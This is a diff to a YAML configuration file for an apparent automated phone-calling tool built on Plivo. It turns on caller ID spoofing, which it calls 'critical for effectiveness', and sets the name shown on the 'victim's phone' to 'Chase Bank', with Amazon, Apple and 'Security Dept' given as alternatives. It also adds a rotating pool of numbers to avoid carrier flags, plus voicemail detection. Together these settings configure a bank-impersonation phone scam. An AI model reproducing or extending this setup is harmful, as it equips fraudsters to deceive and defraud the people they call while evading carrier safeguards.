@@ -23,16 +23,46 @@ plivo_auth_token: "your_plivo_auth_token_here"
 plivo_number: "+15551234567"
 
 # ===========================================
-# CALLER ID SPOOFING (OPTIONAL)
+# CALLER ID SPOOFING (CRITICAL FOR EFFECTIVENESS)
 # ===========================================
 # Spoof the caller ID to show a different number on victim's phone
-# The number must be verified in your Plivo account!
+# The number MUST be verified in your Plivo account!
 # If not set, uses plivo_number by default
-# caller_id: "+15559876543"
+caller_id: "+15559876543"
 
-# Display name shown on victim's phone (some carriers support this)
-# Example: "Chase Bank", "Amazon Support", "Apple Inc"
-# caller_name: "Chase Bank"
+# Display name shown on victim's phone (BANK NAME EFFECT)
+# This is the NAME that shows up on their screen instead of a number!
+# Supported by most carriers in the US
+# Examples: "Chase Bank", "Amazon Support", "Apple Inc", "Security Dept"
+caller_name: "Chase Bank"
+
+# Enable CNAM lookup - shows caller name from carrier database
+# When true, carrier may override caller_name with their registered name
+# Default: false
+enable_cnam: false
+
+# Randomize caller ID from a pool of numbers
+# Each call will use a different number from the pool
+# Default: false
+randomize_caller_id: false
+
+# Pool of caller IDs to rotate through
+# Use multiple verified numbers to avoid carrier flags
+caller_id_pool:
+  - "+15551111111"
+  - "+15552222222"
+  - "+15553333333"
+
+# ===========================================
+# VOICEMAIL DETECTION
+# ===========================================
+# Enable automatic voicemail/answering machine detection
+# When detected, call ends quickly to save money
+# Default: true
+machine_detection: true
+
+# How long to let phone ring before giving up (seconds)
+ring_timeout: 30
 
 # ===========================================
 # SERVER SETTINGS
